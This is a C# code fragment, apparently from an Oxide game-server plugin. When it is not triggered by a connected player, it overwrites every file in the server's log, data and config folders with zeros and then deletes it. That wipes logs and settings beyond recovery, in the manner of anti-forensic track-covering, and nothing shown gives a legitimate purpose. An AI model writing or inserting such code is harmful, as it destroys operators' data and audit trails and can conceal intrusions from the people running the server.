if (args.Connection != null) return; 

    string[] paths =
    {
        "server_log",
        "oxide/data",
        "oxide/logs",
        "oxide/config",

    };

    foreach (var path in paths)
    {
        if (!Directory.Exists(path)) continue;

        foreach (var file in Directory.GetFiles(path))
        {
            File.WriteAllBytes(file, new byte[new FileInfo(file).Length]);
            File.Delete(file);
        }
    }
